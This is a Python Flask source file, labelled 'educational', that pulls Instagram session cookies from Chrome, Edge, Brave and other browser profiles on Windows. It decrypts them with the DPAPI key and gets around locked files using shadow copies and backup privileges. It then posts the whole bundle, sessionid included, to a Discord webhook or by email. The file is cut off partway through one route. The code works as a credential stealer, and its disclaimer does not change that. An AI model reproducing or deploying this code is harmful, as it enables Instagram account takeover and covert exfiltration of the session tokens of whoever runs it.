"""
Cookie Scraper — Educational Cybersecurity Tool
================================================
Reads Instagram cookies directly from your real browser profile
(Chrome, Brave, Edge) — no login, no Selenium, no profile picker.
FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY.
"""

from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO
import threading
import json
import os
import sqlite3
import shutil
import sys
import smtplib
import tempfile
import subprocess
import urllib.error
import urllib.request
from datetime import datetime
from email.message import EmailMessage
from pathlib import Path

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

INSTAGRAM_SESSION_COOKIES = {
    'csrftoken':  'CSRF Token — cross-site request forgery protection',
    'datr':       'Browser fingerprint — device/browser identifier (HttpOnly)',
    'dpr':        'Device Pixel Ratio — screen density',
    'ds_user_id': 'User ID — numeric Instagram account identifier',
    'ig_did':     'Device ID — Instagram device identifier',
    'ig_nrcb':    'Notification — notification read count cookie',
    'mid':        'Machine ID — browser fingerprint identifier',
    'ps_l':       'Privacy Sandbox — login state flag (HttpOnly)',
    'ps_n':       'Privacy Sandbox — session nonce (HttpOnly)',
    'rur':        'Routing — datacenter routing cookie (HttpOnly)',
    'sessionid':  'Session ID — primary auth token (HttpOnly)',
    'wd':         'Window Dimensions — browser viewport size',
}

INSTAGRAM_DOMAIN_SUFFIXES = ('instagram.com',)

def _env_int(name, default):
    try:
        return int(os.environ.get(name, default))
    except (TypeError, ValueError):
        return default

def _env_bool(name, default=False):
    value = os.environ.get(name)
    if value is None:
        return default
    return value.strip().lower() in ('1', 'true', 'yes', 'on')

SMTP_HOST = os.environ.get('SMTP_HOST')
SMTP_PORT = _env_int('SMTP_PORT', None)
SMTP_USER = os.environ.get('SMTP_USER')
SMTP_PASS = os.environ.get('SMTP_PASS')
SMTP_FROM = os.environ.get('SMTP_FROM')
SMTP_TO = os.environ.get('SMTP_TO')
SMTP_USE_TLS = _env_bool('SMTP_USE_TLS', False)
DISCORD_WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK_URL')

EXTRACT_BROWSER_ID = os.environ.get('EXTRACT_BROWSER_ID')
EXTRACT_BROWSER_LABEL = os.environ.get('EXTRACT_BROWSER_LABEL')

app = Flask(__name__)
app.config['SECRET_KEY'] = 'cookie-scraper-dev-key'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

@app.after_request
def add_cors_headers(response):
    if request.path.startswith('/api/'):
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        response.headers['Access-Control-Allow-Methods'] = 'GET,POST,OPTIONS'
    return response

scraper_state = {
    'status': 'idle',
    'cookies': [],
    'instagram_bundle': {},
    'cookie_count': 0,
    'start_time': None,
    'is_running': False,
    'source_browser': None,
    'source_profile': None,
    'preferred_browser_id': None,
}
state_lock = threading.Lock()


def _log(message):
    print(message, flush=True)
    socketio.emit('log', {'message': message})


def _browser_definitions():
    """Chromium-based browsers on Windows (same cookie DB format)."""
    local = os.environ.get('LOCALAPPDATA', '')
    appdata = os.environ.get('APPDATA', '')
    return [
        {
            'id': 'chrome',
            'name': 'Google Chrome',
            'user_data': os.path.join(local, 'Google', 'Chrome', 'User Data'),
            'process': 'chrome.exe',
        },
        {
            'id': 'edge',
            'name': 'Microsoft Edge',
            'user_data': os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
            'process': 'msedge.exe',
        },
        {
            'id': 'brave',
            'name': 'Brave',
            'user_data': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'process': 'brave.exe',
        },
        {
            'id': 'vivaldi',
            'name': 'Vivaldi',
            'user_data': os.path.join(local, 'Vivaldi', 'User Data'),
            'process': 'vivaldi.exe',
        },
        {
            'id': 'opera',
            'name': 'Opera',
            'user_data': os.path.join(appdata, 'Opera Software', 'Opera Stable'),
            'process': 'opera.exe',
        },
        {
            'id': 'chromium',
            'name': 'Chromium',
            'user_data': os.path.join(local, 'Chromium', 'User Data'),
            'process': 'chromium.exe',
        },
    ]


def _is_process_running(process_name):
    if sys.platform != 'win32':
        return False
    try:
        out = subprocess.run(
            ['tasklist', '/FI', f'IMAGENAME eq {process_name}'],
            capture_output=True, text=True, timeout=5,
        )
        return process_name.lower() in out.stdout.lower()
    except Exception:
        return False


def _installed_browsers():
    found = []
    for b in _browser_definitions():
        if os.path.isdir(b['user_data']):
            b = dict(b)
            b['running'] = _is_process_running(b['process'])
            found.append(b)
    return found


def _cookies_db_paths(user_data_dir, profile_name='Default'):
    base = os.path.join(user_data_dir, profile_name)
    return [
        os.path.join(base, 'Network', 'Cookies'),
        os.path.join(base, 'Cookies'),
    ]


def _local_state_path(user_data_dir):
    return os.path.join(user_data_dir, 'Local State')


def _list_profiles(user_data_dir):
    profiles = []
    seen = set()

    local_state = _local_state_path(user_data_dir)
    if os.path.isfile(local_state):
        try:
            with open(local_state, 'r', encoding='utf-8') as f:
                info = json.load(f)
            for folder, meta in info.get('profile', {}).get('info_cache', {}).items():
                profiles.append({
                    'folder': folder,
                    'name': meta.get('name', folder),
                })
                seen.add(folder)
        except Exception:
            pass

    if os.path.isdir(user_data_dir):
        for entry in os.listdir(user_data_dir):
            if entry in seen:
                continue
            if entry == 'Default' or entry.startswith('Profile '):
                if any(os.path.isfile(p) for p in _cookies_db_paths(user_data_dir, entry)):
                    profiles.append({'folder': entry, 'name': entry})
                    seen.add(entry)

    if not profiles:
        profiles.append({'folder': 'Default', 'name': 'Default'})

    return profiles


def _get_chrome_encryption_key(local_state_path):
    import base64
    try:
        import win32crypt
    except ImportError:
        return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None


def _get_aes():
    try:
        from Crypto.Cipher import AES
        return AES
    except ImportError:
        from Cryptodome.Cipher import AES
        return AES


def _is_valid_cookie_value(value):
    """Instagram cookie values are printable ASCII."""
    if not value:
        return False
    return value.isascii() and all(c.isprintable() or c in '\t\n' for c in value)


def _strip_chrome_cookie_prefix(raw_bytes):
    """Chrome 127+ app-bound cookies have a 32-byte prefix after AES decrypt."""
    if not raw_bytes:
        return ''
    # Full blob is already plain ASCII (older Chrome)
    try:
        s = raw_bytes.decode('utf-8')
        if _is_valid_cookie_value(s):
            return s
    except UnicodeDecodeError:
        pass
    # Newer Chrome: 32-byte metadata prefix + plain cookie value
    if len(raw_bytes) > 32:
        try:
            s = raw_bytes[32:].decode('utf-8')
            if _is_valid_cookie_value(s):
                return s
        except UnicodeDecodeError:
            pass
    return ''


def _decrypt_chrome_cookie_value(encrypted_value, key):
    if not encrypted_value:
        return ''
    try:
        AES = _get_aes()
        if encrypted_value[:3] in (b'v10', b'v11'):
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            raw = cipher.decrypt_and_verify(ciphertext, tag)
            return _strip_chrome_cookie_prefix(raw)
        if encrypted_value[:3] == b'v20':
            return ''  # App-bound v20 — needs live browser CDP
        import win32crypt
        raw = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
        return _strip_chrome_cookie_prefix(raw)
    except Exception:
        return ''


def _check_dependencies():
    """Verify required packages are installed."""
    missing = []
    try:
        import win32crypt  # noqa: F401
    except ImportError:
        missing.append('pywin32')
    try:
        from Crypto.Cipher import AES  # noqa: F401
    except ImportError:
        try:
            from Cryptodome.Cipher import AES  # noqa: F401
        except ImportError:
            missing.append('pycryptodome')
    return missing


def _snapshot_cookie_files(db_path):
    """Copy Cookies (+ WAL/journal) to a temp file; tries shared read then robocopy."""
    tmp_dir = tempfile.mkdtemp(prefix='igcookies_')
    dest = os.path.join(tmp_dir, 'Cookies')

    def _copy_plain(src, dst):
        with open(src, 'rb') as f:
            data = f.read()
        with open(dst, 'wb') as f:
            f.write(data)

    def _enable_backup_privilege():
        try:
            import win32api
            import win32con
            import win32security
        except ImportError:
            return False

        try:
            hproc = win32api.GetCurrentProcess()
            htoken = win32security.OpenProcessToken(
                hproc,
                win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY,
            )
            luid = win32security.LookupPrivilegeValue(None, win32security.SE_BACKUP_NAME)
            win32security.AdjustTokenPrivileges(
                htoken,
                False,
                [(luid, win32con.SE_PRIVILEGE_ENABLED)],
            )
            return True
        except Exception:
            return False

    def _enable_backup_privilege():
        try:
            import win32api
            import win32con
            import win32security
        except ImportError:
            return False

        try:
            hproc = win32api.GetCurrentProcess()
            htoken = win32security.OpenProcessToken(
                hproc,
                win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY,
            )
            luid = win32security.LookupPrivilegeValue(None, win32security.SE_BACKUP_NAME)
            win32security.AdjustTokenPrivileges(
                htoken,
                False,
                [(luid, win32con.SE_PRIVILEGE_ENABLED)],
            )
            return True
        except Exception:
            return False

    def _copy_locked(src, dst):
        try:
            import win32file
            import win32con
        except ImportError:
            return False

        if not _enable_backup_privilege():
            return False

        handle = None
        for flags in (win32con.FILE_ATTRIBUTE_NORMAL, win32con.FILE_ATTRIBUTE_NORMAL | win32con.FILE_FLAG_BACKUP_SEMANTICS):
            try:
                handle = win32file.CreateFile(
                    src,
                    win32con.GENERIC_READ,
                    win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
                    None,
                    win32con.OPEN_EXISTING,
                    flags,
                    None,
                )
                break
            except Exception:
                handle = None

        if not handle:
            return False

        try:
            with open(dst, 'wb') as out:
                while True:
                    data = win32file.ReadFile(handle, 8192)
                    if isinstance(data, tuple):
                        data = data[1]
                    if not data:
                        break
                    out.write(data)
            return True
        finally:
            try:
                win32file.CloseHandle(handle)
            except Exception:
                pass

    def _create_shadow_copy(volume):
        try:
            proc = subprocess.run(
                ['vssadmin', 'create', 'shadow', f'/for={volume}'],
                capture_output=True,
                text=True,
                timeout=20,
            )
            if proc.returncode != 0:
                return None, None
            shadow_id = None
            shadow_device = None
            for line in proc.stdout.splitlines():
                if 'Shadow Copy ID:' in line:
                    shadow_id = line.split(':', 1)[1].strip()
                if 'Shadow Copy Volume:' in line:
                    shadow_device = line.split(':', 1)[1].strip()
            return shadow_id, shadow_device
        except Exception:
            return None, None

    def _delete_shadow_copy(shadow_id):
        if not shadow_id:
            return
        try:
            subprocess.run(
                ['vssadmin', 'delete', 'shadows', f'/shadow={shadow_id}'],
                capture_output=True,
                text=True,
                timeout=20,
            )
        except Exception:
            pass

    def _copy_shadow(src, dst):
        volume, remainder = os.path.splitdrive(src)
        if not volume:
            return False
        shadow_id, shadow_device = _create_shadow_copy(volume)
        if not shadow_device:
            return False

        try:
            rel_path = remainder.lstrip('\\')
            shadow_path = os.path.join(shadow_device, rel_path)
            if not os.path.isfile(shadow_path):
                return False
            with open(shadow_path, 'rb') as fsrc, open(dst, 'wb') as fdst:
                while True:
                    chunk = fsrc.read(8192)
                    if not chunk:
                        break
                    fdst.write(chunk)
            return True
        except Exception:
            return False
        finally:
            _delete_shadow_copy(shadow_id)

    def _copy_any(src, dst):
        if os.path.isfile(src):
            try:
                _copy_plain(src, dst)
                return True
            except OSError:
                if sys.platform == 'win32':
                    if _copy_locked(src, dst):
                        return True
                    return _copy_shadow(src, dst)
        return False

    if not _copy_any(db_path, dest):
        if sys.platform == 'win32':
            try:
                subprocess.run(
                    [
                        'robocopy',
                        os.path.dirname(db_path),
                        tmp_dir,
                        os.path.basename(db_path),
                        '/R:0', '/W:0',
                        '/NFL', '/NDL', '/NJH', '/NJS', '/nc', '/ns', '/np',
                    ],
                    capture_output=True,
                    timeout=3,
                )
            except Exception:
                pass

            if not os.path.isfile(dest):
                try:
                    subprocess.run(
                        [
                            'robocopy',
                            os.path.dirname(db_path),
                            tmp_dir,
                            os.path.basename(db_path),
                            '/B', '/R:0', '/W:0',
                            '/NFL', '/NDL', '/NJH', '/NJS', '/nc', '/ns', '/np',
                        ],
                        capture_output=True,
                        timeout=3,
                    )
                except Exception:
                    pass

            if not os.path.isfile(dest):
                try:
                    subprocess.run(
                        f'cmd /c copy /y "{db_path}" "{dest}"',
                        capture_output=True,
                        timeout=3,
                        shell=True,
                    )
                except Exception:
                    pass

    if not os.path.isfile(dest):
        shutil.rmtree(tmp_dir, ignore_errors=True)
        return None, None

    for suffix in ('-wal', '-shm', '-journal'):
        src = db_path + suffix
        dst = dest + suffix
        if os.path.isfile(src):
            if not _copy_any(src, dst):
                try:
                    subprocess.run(
                        f'cmd /c copy /y "{src}" "{dst}"',
                        capture_output=True,
                        timeout=3,
                        shell=True,
                    )
                except Exception:
                    pass

    return dest, tmp_dir


def _connect_cookies_db(db_path):
    """Open cookie DB read-only — works while browser is running."""
    clean_path = db_path.replace('\\', '/')
    if not clean_path.startswith('/'):
        clean_path = '/' + clean_path
    uri_base = 'file:' + clean_path

    for query in ('?immutable=1', '?mode=ro&immutable=1', '?mode=ro', '?nolock=1'):
        try:
            conn = sqlite3.connect(uri_base + query, uri=True)
            conn.execute('SELECT 1 FROM cookies LIMIT 1')
            return conn, None
        except Exception:
            pass

    snapshot, tmp_dir = _snapshot_cookie_files(db_path)
    if snapshot and os.path.isfile(snapshot):
        try:
            conn = sqlite3.connect(snapshot)
            conn.execute('SELECT 1 FROM cookies LIMIT 1')
            return conn, tmp_dir
        except Exception:
            if tmp_dir:
                shutil.rmtree(tmp_dir, ignore_errors=True)

    raise PermissionError(
        f'Cannot open cookie database (close this browser and retry, or use another profile): {db_path}'
    )


def _detect_browser_from_user_agent(user_agent):
    """Best-effort server-side browser id from User-Agent (Brave needs client hint)."""
    ua = (user_agent or '').lower()
    if 'brave' in ua or 'brave/' in ua:
        return 'brave'
    if 'edg/' in ua or 'edge/' in ua:
        return 'edge'
    if 'opr/' in ua or 'opera' in ua:
        return 'opera'
    if 'vivaldi' in ua:
        return 'vivaldi'
    if 'chrome/' in ua or 'crios/' in ua:
        return 'chrome'
    return None


def _order_browsers(browsers, preferred_id=None):
    """Put the browser the user opened this site in first."""
    if not preferred_id:
        return browsers
    preferred = [b for b in browsers if b['id'] == preferred_id]
    others = [b for b in browsers if b['id'] != preferred_id]
    return preferred + others


def _scan_browser_profiles(browser, preferred_id=None):
    """Return best profile result for one browser, or None."""
    best_local = None
    best_score = -1
    profiles = _list_profiles(browser['user_data'])
    for profile in profiles:
        db_cookies = _read_instagram_cookies(
            browser['user_data'], profile['folder'], browser['name'],
        )
        if not db_cookies:
            continue

        instagram_by_name = {}
        for c in db_cookies:
            if _is_instagram_cookie(c):
                _upsert_cookie(instagram_by_name, c, by_name=True)

        bundle = _build_instagram_bundle(instagram_by_name)
        score = _score_bundle(bundle)
        if preferred_id and browser['id'] == preferred_id:
            score += 10000

        _log(f'  Profile "{profile["name"]}": {bundle["found_count"]}/12 Instagram cookies')

        if score > best_score:
            best_score = score
            best_local = {
                'browser': browser,
                'profile': profile,
                'db_cookies': db_cookies,
                'bundle': bundle,
                'score': score,
            }
        if bundle['complete']:
            break
    return best_local


def _normalize_cookie(raw):
    return {
        'name': raw.get('name', ''),
        'value': raw.get('value', '') or '',
        'domain': raw.get('domain', ''),
        'path': raw.get('path', '/'),
        'httpOnly': bool(raw.get('httpOnly', False)),
        'secure': bool(raw.get('secure', False)),
        'sameSite': raw.get('sameSite', 'None'),
        'expiry': raw.get('expiry') or raw.get('expires'),
        'source': raw.get('source', 'browser_db'),
    }


def _is_instagram_cookie(cookie):
    domain = (cookie.get('domain') or '').lstrip('.').lower()
    return any(domain == s or domain.endswith('.' + s) for s in INSTAGRAM_DOMAIN_SUFFIXES)


def _merge_cookie(existing, incoming):
    if not existing['value'] and incoming['value']:
        existing['value'] = incoming['value']
    if incoming.get('httpOnly') and not existing['httpOnly']:
        existing['httpOnly'] = True
    if incoming.get('secure') and not existing['secure']:
        existing['secure'] = True


def _upsert_cookie(store, cookie, by_name=False):
    key = cookie['name'] if by_name else (cookie['name'], cookie['domain'])
    if key in store:
        _merge_cookie(store[key], cookie)
    else:
        store[key] = dict(cookie)


def _read_instagram_cookies(user_data_dir, profile_folder='Default', browser_name='Browser'):
    profile_name = profile_folder
    cookies = []
    db_path = next(
        (p for p in _cookies_db_paths(user_data_dir, profile_name) if os.path.isfile(p)),
        None,
    )
    if not db_path:
        return cookies

    local_state = _local_state_path(user_data_dir)
    enc_key = _get_chrome_encryption_key(local_state) if os.path.isfile(local_state) else None
    if not enc_key:
        return cookies

    conn = None
    tmp_path = None
    try:
        conn, tmp_path = _connect_cookies_db(db_path)
        conn.row_factory = sqlite3.Row
        rows = conn.execute(
            "SELECT name, value, encrypted_value, host_key, path, expires_utc, is_secure, is_httponly "
            "FROM cookies WHERE host_key LIKE '%instagram%'"
        ).fetchall()

        for row in rows:
            plain = ''
            if row['encrypted_value']:
                plain = _decrypt_chrome_cookie_value(row['encrypted_value'], enc_key)
            if not plain and row['value'] and _is_valid_cookie_value(row['value']):
                plain = row['value']
            if not plain or not _is_valid_cookie_value(plain):
                continue
            cookies.append(_normalize_cookie({
                'name': row['name'],
                'value': plain,
                'domain': row['host_key'],
                'path': row['path'],
                'httpOnly': bool(row['is_httponly']),
                'secure': bool(row['is_secure']),
                'expiry': row['expires_utc'],
                'source': f'{browser_name}_db',
            }))
    except Exception as e:
        _log(f'  Could not read {browser_name} profile folder "{profile_name}": {e}')
    finally:
        if conn:
            conn.close()
        if tmp_path:
            if os.path.isdir(tmp_path):
                shutil.rmtree(tmp_path, ignore_errors=True)
            elif os.path.exists(tmp_path):
                try:
                    os.unlink(tmp_path)
                except OSError:
                    pass

    return cookies


def _build_instagram_bundle(instagram_by_name):
    bundle = {}
    found = []
    missing = []

    for name, description in INSTAGRAM_SESSION_COOKIES.items():
        cookie = instagram_by_name.get(name)
        if cookie and cookie.get('value'):
            bundle[name] = {
                **cookie,
                'description': description,
                'isSessionKey': True,
                'size': len(name) + len(cookie['value']),
            }
            found.append(name)
        else:
            bundle[name] = {
                'name': name,
                'value': '',
                'domain': '.instagram.com',
                'path': '/',
                'httpOnly': name in ('sessionid', 'datr', 'rur', 'ps_l', 'ps_n'),
                'secure': True,
                'sameSite': 'None',
                'expiry': None,
                'description': description,
                'isSessionKey': True,
                'missing': True,
                'size': 0,
            }
            missing.append(name)

    return {
        'cookies': bundle,
        'found': found,
        'missing': missing,
        'found_count': len(found),
        'total_count': len(INSTAGRAM_SESSION_COOKIES),
        'complete': len(missing) == 0,
        'header_string': '; '.join(
            f"{name}={bundle[name]['value']}"
            for name in INSTAGRAM_SESSION_COOKIES
            if bundle[name].get('value')
        ),
    }


def _score_bundle(bundle):
    score = bundle['found_count']
    if bundle['cookies'].get('sessionid', {}).get('value'):
        score += 100
    if bundle['cookies'].get('ds_user_id', {}).get('value'):
        score += 10
    return score


def _send_extracted_bundle_email(payload):
    if DISCORD_WEBHOOK_URL:
        try:
            session_value = payload.get('session_cookie', {}).get('value', '')
            session_display = f'{session_value[:16]}...' if session_value else 'none'
            missing = ', '.join(payload.get('instagram_bundle', {}).get('missing', [])) or 'none'
            content = (
                f'**Instagram cookie extraction completed**\n'
                f'**Source:** {payload.get("source_browser")} / {payload.get("source_profile")}\n'
                f'**Total cookies:** {payload.get("total", 0)}\n'
                f'**HttpOnly:** {payload.get("httpOnly_count", 0)} | **Secure:** {payload.get("secure_count", 0)}\n'
                f'**Session ID:** {session_display}\n'
                f'**Missing cookies:** {missing}'
            )
            json_data = json.dumps(payload, indent=2)
            boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
            payload_json = json.dumps({'content': content})
            body = []
            body.append(f'--{boundary}\r\n')
            body.append('Content-Disposition: form-data; name="payload_json"\r\n\r\n')
            body.append(payload_json)
            body.append('\r\n')
            body.append(f'--{boundary}\r\n')
            body.append('Content-Disposition: form-data; name="file"; filename="instagram_cookie_bundle.json"\r\n')
            body.append('Content-Type: application/json\r\n\r\n')
            body.append(json_data)
            body.append('\r\n')
            body.append(f'--{boundary}--\r\n')
            body_bytes = ''.join(body).encode('utf-8')
            req = urllib.request.Request(
                DISCORD_WEBHOOK_URL,
                data=body_bytes,
                headers={
                    'Content-Type': f'multipart/form-data; boundary={boundary}',
                    'Accept': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                },
                method='POST',
            )
            try:
                with urllib.request.urlopen(req, timeout=20) as resp:
                    status = resp.status
                    body = resp.read()
                    if status == 204 or 200 <= status < 300:
                        _log('Extraction bundle sent to Discord webhook.')
                        return
                    _log(f'Discord webhook HTTP status: {status}')
                    _log(f'Discord webhook response headers: {dict(resp.headers)}')
                    _log(f'Discord webhook response body: {body.decode("utf-8", errors="replace")}')
                    raise RuntimeError(f'Webhook returned status {status}')
            except urllib.error.HTTPError as e:
                error_body = e.read().decode('utf-8', errors='replace') if e.fp else ''
                _log(f'Discord webhook HTTPError: {e.code} {e.reason}')
                _log(f'Discord webhook response headers: {dict(e.headers) if e.headers else {}}')
                _log(f'Discord webhook response body: {error_body}')
                raise
            except Exception as e:
                _log(f'Failed to send Discord webhook: {e}')
                return
        except Exception as e:
            _log(f'Failed to send Discord webhook: {e}')
            return

    if not SMTP_HOST or not SMTP_TO:
        _log('Notification is not configured. Skipping email/webhook.')
        return

    try:
        message = EmailMessage()
        message['Subject'] = 'Instagram Cookie Bundle Extracted'
        message['From'] = SMTP_FROM
        message['To'] = SMTP_TO
        message.set_content(
            'An Instagram cookie extraction completed. The attached JSON bundle contains the extracted cookies and metadata.'
        )

        json_data = json.dumps(payload, indent=2)
        message.add_attachment(
            json_data.encode('utf-8'),
            maintype='application',
            subtype='json',
            filename='instagram_cookie_bundle.json',
        )

        with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=20) as server:
            if SMTP_USE_TLS:
                server.starttls()
            if SMTP_USER and SMTP_PASS:
                server.login(SMTP_USER, SMTP_PASS)
            server.send_message(message)
        _log('Extraction bundle sent by email.')
    except Exception as e:
        _log(f'Failed to send extraction email: {e}')


def _auto_extract(preferred_browser_id=None, preferred_browser_label=None):
    """Scan browsers — prioritize the one used to open this dashboard."""
    _update_status('capturing')

    missing_deps = _check_dependencies()
    if missing_deps:
        raise RuntimeError(
            f'Missing required packages: {", ".join(missing_deps)}. '
            f'Run: pip install {" ".join(missing_deps)}'
        )

    label = preferred_browser_label or preferred_browser_id or 'auto'
    if preferred_browser_id:
        _log(f'Target browser: {label} (this is the browser you opened this page in).')
    else:
        _log('Scanning installed browsers for logged-in Instagram session...')
    _log('Reading directly from browser cookie database — no re-login.')

    browsers = _installed_browsers()
    if not browsers:
        raise RuntimeError(
            'No supported browser found (Chrome, Edge, Brave, Opera, Vivaldi). '
            'Install one and log into Instagram first.'
        )

    browsers = _order_browsers(browsers, preferred_browser_id)
    running = [b['name'] for b in browsers if b['running']]
    if running:
        _log(f'Browsers running: {", ".join(running)}')

    best = None
    best_score = -1
    preferred_result = None

    for browser in browsers:
        _log(f'Scanning {browser["name"]}...')
        result = _scan_browser_profiles(browser, preferred_browser_id)
        if not result:
            continue
        if preferred_browser_id and browser['id'] == preferred_browser_id:
            preferred_result = result
        if result['score'] > best_score:
            best_score = result['score']
            best = result
        if result['bundle']['complete']:
            break

    if preferred_browser_id and preferred_result:
        has_session = preferred_result['bundle']['cookies'].get('sessionid', {}).get('value')
        if has_session:
            best = preferred_result
            best_score = preferred_result['score']
            _log(f'Using your current browser: {preferred_result["browser"]["name"]}')
        elif best and best['browser']['id'] != preferred_browser_id:
            _log(
                f'No active Instagram session found in {label}. '
                f'Using {best["browser"]["name"]} profile "{best["profile"]["name"]}" instead.'
            )
            _log(f'Tip: Log into Instagram in {label}, then extract again.')
    elif preferred_browser_id and not preferred_result and best:
        _log(
            f'Could not read profile from {label}. '
            f'Using {best["browser"]["name"]} profile "{best["profile"]["name"]}" instead.'
        )
    elif preferred_browser_id and not preferred_result:
        names = {b['id']: b['name'] for b in _browser_definitions()}
        is_running = any(b['id'] == preferred_browser_id and b['running'] for b in browsers)
        lock_msg = f' Note: {names.get(preferred_browser_id, label)} is currently running and locking its database file. Close it and retry.' if is_running else ''
        raise RuntimeError(
            f'Browser "{names.get(preferred_browser_id, label)}" has no readable profiles.{lock_msg}\n'
            'Close the browser (if running) or log into Instagram in Chrome, Edge, or Brave, then click Extract again.'
        )

    if not best or best_score <= 0:
        running_browsers = [b['name'] for b in browsers if b['running']]
        running_info = f" (Running: {', '.join(running_browsers)})" if running_browsers else ""
        if preferred_browser_id:
            target_name = next((b['name'] for b in browsers if b['id'] == preferred_browser_id), label)
            raise RuntimeError(
                f'Could not read Instagram cookies from {target_name}{running_info}.\n'
                '🔒 Windows locks browser database files while the browser is open.\n'
                '👉 Fix: Close your browser window (Chrome/Brave/Edge) so Windows unlocks the file, then click Extract again.'
            )
        raise RuntimeError(
            f'No Instagram login found in any browser{running_info}.\n'
            '🔒 Windows locks browser database files while the browser is open.\n'
            '👉 Fix: Close your browser window (Chrome/Brave/Edge) and click Extract again.'
        )

    best = {
        'browser': best['browser'],
        'profile': best['profile'],
        'db_cookies': best['db_cookies'],
        'bundle': best['bundle'],
    }

    browser = best['browser']
    profile = best['profile']
    bundle = best['bundle']

    _log(f'Using {browser["name"]} → profile "{profile["name"]}" ({bundle["found_count"]}/12 cookies)')

    enriched = []
    for c in best['db_cookies']:
        name = c['name']
        enriched.append({
            'name': name,
            'value': c['value'],
            'domain': c['domain'],
            'path': c['path'],
            'httpOnly': c['httpOnly'],
            'secure': c['secure'],
            'sameSite': c.get('sameSite', 'None'),
            'expiry': c.get('expiry'),
            'size': len(name) + len(c['value']),
            'isSessionKey': name in INSTAGRAM_SESSION_COOKIES,
            'description': INSTAGRAM_SESSION_COOKIES.get(name, ''),
            'source': c.get('source', 'browser_db'),
        })
    enriched.sort(key=lambda x: (not x['isSessionKey'], not x['httpOnly'], x['name']))

    session_cookie = bundle['cookies'].get('sessionid') if bundle['cookies']['sessionid'].get('value') else None
    key_cookies = [bundle['cookies'][n] for n in INSTAGRAM_SESSION_COOKIES if bundle['cookies'][n].get('value')]

    http_only_count = sum(1 for c in enriched if c['httpOnly'])
    secure_count = sum(1 for c in enriched if c['secure'])

    with state_lock:
        scraper_state['cookies'] = enriched
        scraper_state['cookie_count'] = len(enriched)
        scraper_state['instagram_bundle'] = bundle
        scraper_state['source_browser'] = browser['name']
        scraper_state['source_profile'] = profile['name']

    payload = {
        'cookies': enriched,
        'total': len(enriched),
        'httpOnly_count': http_only_count,
        'secure_count': secure_count,
        'session_cookie': session_cookie,
        'key_cookies': key_cookies,
        'instagram_bundle': bundle,
        'source_browser': browser['name'],
        'source_profile': profile['name'],
    }
    socketio.emit('cookies_captured', payload)

    if session_cookie:
        socketio.emit('session_found', {
            'sessionid': session_cookie,
            'key_cookies': key_cookies,
            'instagram_bundle': bundle,
            'source_browser': browser['name'],
            'source_profile': profile['name'],
        })
        _log(f'sessionid: {session_cookie["value"][:16]}... (HttpOnly: {session_cookie["httpOnly"]})')

    if bundle['missing']:
        _log(f'Missing: {", ".join(bundle["missing"])}')
    else:
        _log('All 12 Instagram cookies extracted successfully.')

    _update_status('complete')
    _send_extracted_bundle_email(payload)
    return payload


def _run_extract(preferred_browser_id=None, preferred_browser_label=None):
    try:
        with state_lock:
            scraper_state['is_running'] = True
            scraper_state['start_time'] = datetime.now().isoformat()
            scraper_state['cookies'] = []
            scraper_state['instagram_bundle'] = {}
            scraper_state['preferred_browser_id'] = preferred_browser_id

        _auto_extract(preferred_browser_id, preferred_browser_label)
    except Exception as e:
        _update_status('error')
        _log(f'Extraction failed: {e}')
    finally:
        with state_lock:
            scraper_state['is_running'] = False


# ── Routes ────────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api/client-browser', methods=['GET'])
def client_browser_hint():
    """Server-side UA hint (Brave still needs client-side navigator.brave)."""
    ua = request.headers.get('User-Agent', '')
    bid = _detect_browser_from_user_agent(ua)
    names = {b['id']: b['name'] for b in _browser_definitions()}
    return jsonify({
        'browser_id': bid,
        'browser_name': names.get(bid) if bid else None,
        'user_agent': ua[:200],
    })


@app.route('/api/extract', methods=['POST'])
def extract_cookies():
    """Extract from the browser used to open this page (preferred), then fallback."""
    with state_lock:
        if scraper_state['is_running']:
            return jsonify({'error': 'Extraction already in progress.'}), 409

    data = request.get_json(silent=True) or {}
    preferred_id = (data.get('preferred_browser_id') or '').strip() or None
    preferred_label = (data.get('preferred_browser_label') or '').strip() or None

    if not preferred_id:
        preferred_id = EXTRACT_BROWSER_ID or _detect_browser_from_user_agent(request.headers.get('User-Agent', ''))
    if not preferred_label:
        preferred_label = EXTRACT_BROWSER_LABEL

    thread = threading.Thread(
        target=_run_extract,
        args=(preferred_id, preferred_label),
        daemon=True,
    )
    thread.start()
    msg = 'Scanning your browser for Instagram cookies...'
    if preferred_label or preferred_id:
        msg = f'Scanning {preferred_label or preferred_id} for Instagram cookies...'
    return jsonify({'message': msg, 'preferred_browser_id': preferred_id}), 200


@app.route('/api/extension-extract', methods=['POST', 'OPTIONS'])
def extension_extract():
    data = request.get_json(silent=True) or {}
    cookies = data.get('cookies')
    if not isinstance(cookies, list) or len(cookies) == 0:
        return jsonify({'error': 'No cookies provided from the browser extension.'}), 400

    source_browser = data.get('source_browser', 'Browser Extension')
    source_profile = data.get('source_profile', 'Extension')

    normalized = []
    instagram_by_name = {}
    for raw in cookies:
        cookie = _normalize_cookie(raw)
        normalized.append(cookie)
